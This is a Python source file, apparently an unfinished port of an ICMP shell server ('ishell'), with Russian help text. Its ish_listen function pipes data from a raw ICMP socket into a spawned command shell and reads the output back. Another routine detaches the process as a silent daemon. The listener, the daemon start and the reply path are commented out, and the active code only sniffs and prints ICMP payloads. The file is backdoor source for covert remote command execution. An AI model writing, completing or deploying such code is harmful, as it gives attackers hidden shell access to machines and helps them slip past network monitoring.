import argparse
import os
import selectors
import sys
import multiprocessing
import socket
import signal
import subprocess

from scapy.layers.inet import ICMP, IP
from scapy.sendrecv import sniff

import ish_open
import ishell


def ish_listen(sockfd, sin):
    fd = subprocess.Popen(['cmd'], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)

    selector = selectors.DefaultSelector()
    selector.register(sockfd, selectors.EVENT_READ)
    selector.register(fd.stdout, selectors.EVENT_READ)

    try:
        while True:
            for key, events in selector.select():
                if key.fileobj == sockfd:
                    # Read from the socket and send to the shell
                    recv_buf, _ = sockfd.recvfrom(ishell.ish_info.packetsize)
                    fd.stdin.write(recv_buf)
                    fd.stdin.flush()

                    print("-----+ IN DATA +------\n{}".format(recv_buf.decode('utf-8')))
                elif key.fileobj == fd.stdout:
                    # Read from the shell and send to the socket
                    send_buf = fd.stdout.read(ishell.ish_info.packetsize)
                    if not send_buf:
                        break

                    ishell.sendhdr.ts = 0
                    ishell.ish_info.seq += 1

                    # sockfd.sendto(send_buf, sin)
                    print("-----+ OUT DATA +-----\n{}".format(send_buf.decode('utf-8')))
    finally:
        selector.unregister(sockfd)
        selector.unregister(fd.stdout)
        selector.close()

        fd.stdin.close()
        fd.stdout.close()
        fd.stderr.close()
        fd.wait()
# def ish_listen():
#     child_conn, process = ish_open.popen2("echo Hello world!")
#     ishell.sendhdr.cntrl = 0
#
#     process.stdin.close()
#
#     output = process.stdout.read()
#     error = process.stderr.read()
#
#     os.close(child_conn)
#     process.communicate()
#
#     print(output.decode('cp866'))
#     print(error.decode('cp866'))


def sig_handle():
    return


def child_process():
    try:
        os.chdir("/")
    except Exception as e:
        print(f"Error changing directory: {e}")

    try:
        os.umask(0)
    except Exception as e:
        print(f"Error setting umask: {e}")

    try:
        with open(os.devnull, 'w') as null_file:
            os.dup2(null_file.fileno(), sys.stdin.fileno())

            os.dup2(null_file.fileno(), sys.stdout.fileno())

            os.dup2(null_file.fileno(), sys.stderr.fileno())

        return 0
    except Exception:
        return -1


def edaemon():
    process = multiprocessing.Process(target=child_process)

    try:
        process.start()
        process.join()
    except Exception:
        sys.exit(-1)
    else:
        sys.exit(0)


def packet_callback(packet):
    if ICMP in packet and packet[ICMP].type == 8:  # ICMP Echo Request
        print(f"Received ICMP packet from {packet[IP].src}")
        print(f"Data: {packet[ICMP].payload.load.decode('utf-8')}")


def main():
    ish_debug = 1

    parser = argparse.ArgumentParser(description='ICMP Shell')

    parser.add_argument('-i', help='Назначение идентификатора процесса (диапазон: 0-65535; по-умолчанию 1515)')
    parser.add_argument('-d', help='Запуск сервера в режиме debug', action='store_true')
    parser.add_argument('-t', help='Назначение типа пакетов ICMP (по-умолчанию 0)')
    parser.add_argument('-p', help='Назначение размера пакета (по-умолчанию 512)')

    args = parser.parse_args()

    if args.i:
        ishell.ish_info.id = args.i
    if args.t:
        ishell.ish_info.type = args.t
    if args.p:
        ishell.ish_info.packetsize = args.p
    if args.d:
        ish_debug = 0

    sniff(filter="icmp", prn=packet_callback)
   #if (ish_debug):
   #    if edaemon():
   #        print("Cannot start server as daemon!")
   #        sys.exit(-1)

   #try:
   #    sockfd = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
   #    ish_listen(sockfd, None)
   #    sockfd.close()
   #except socket.error as e:
   #    print(e)

   #try:
   #    signal.signal(signal.SIGPIPE, sig_handle)
   #except AttributeError:
   #    pass

    # ish_listen()



if __name__ == '__main__':
    main()
